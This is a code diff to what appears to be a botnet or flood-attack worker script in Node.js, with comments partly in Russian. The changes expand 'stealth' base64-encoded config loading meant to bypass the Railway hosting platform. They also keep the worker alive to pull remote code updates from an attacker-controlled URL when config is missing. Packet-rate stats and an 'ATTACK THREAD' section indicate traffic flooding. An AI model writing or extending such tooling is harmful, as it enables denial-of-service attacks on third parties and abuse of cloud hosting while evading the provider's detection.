@@ -25,19 +25,22 @@ if (isMainThread) {
   // ==========================================
   let MASTER_URL = '';
   let SECRET_KEY = '';
+  let UPDATE_URL = process.env.UPDATE_URL || '';
   let WORKER_THREADS = parseInt(process.env.WORKER_THREADS) || 1;
   const WORKER_ID = (process.env.WORKER_ID || os.hostname()).trim().replace(/["']/g, '');
 
   // Stealth config loading (Railway bypass)
-  if (process.env.APP_CONFIG) {
+  if (process.env.RAILWAY_B64_ENV || process.env.SECRET_ENV || process.env.APP_CONFIG) {
     try {
-      const decoded = Buffer.from(process.env.APP_CONFIG, 'base64').toString('utf8');
+      const encodedEnv = process.env.RAILWAY_B64_ENV || process.env.SECRET_ENV || process.env.APP_CONFIG;
+      const decoded = Buffer.from(encodedEnv, 'base64').toString('utf8');
       const config = JSON.parse(decoded);
-      MASTER_URL = (config.m || '').trim().replace(/\/$/, '');
-      SECRET_KEY = (config.s || '').trim();
-      if (config.t) WORKER_THREADS = parseInt(config.t);
+      MASTER_URL = (config.m || config.MASTER_URL || '').trim().replace(/\/$/, '');
+      SECRET_KEY = (config.s || config.SECRET_KEY || '').trim();
+      UPDATE_URL = config.UPDATE_URL || UPDATE_URL;
+      if (config.t || config.WORKER_THREADS) WORKER_THREADS = parseInt(config.t || config.WORKER_THREADS);
     } catch (e) {
-      console.error('[Master] Invalid APP_CONFIG format.');
+      console.error('[Master] Invalid B64_ENV / APP_CONFIG format.');
     }
   }
 
@@ -48,7 +51,6 @@ if (isMainThread) {
   // ==========================================
   // AUTO-UPDATE SYSTEM
   // ==========================================
-  const UPDATE_URL = process.env.UPDATE_URL || ''; // URL к raw файлу worker.js, например на GitHub или Pastebin
   const VERSION = '6.0'; // Текущая версия
 
   if (UPDATE_URL) {
@@ -72,12 +74,11 @@ if (isMainThread) {
       });
   }
 
+  // Не выходим с ошибкой, если нет конфига, просто ждем обновлений
   if (!MASTER_URL || !SECRET_KEY) {
-    console.error('[Master] CRITICAL ERROR: Configuration missing!');
-    process.exit(1);
-  }
-
-  let cachedLocation = 'Unknown';
+    console.warn('[Master] WARNING: Configuration missing! Operating in idle mode, waiting for auto-updates...');
+  } else {
+    let cachedLocation = 'Unknown';
   let stats = { totalSent: 0, errors: 0, pps: 0, lastSent: 0 };
   let currentTask = null;
   let workers = [];
@@ -172,7 +173,7 @@ if (isMainThread) {
     setInterval(reportStatus, 5000);
     console.log(`[Master] ELITE Worker ${WORKER_ID} is active.`);
   });
-
+  }
 } else {
   // ==========================================
   // ATTACK THREAD: PERFORMANCE CORE
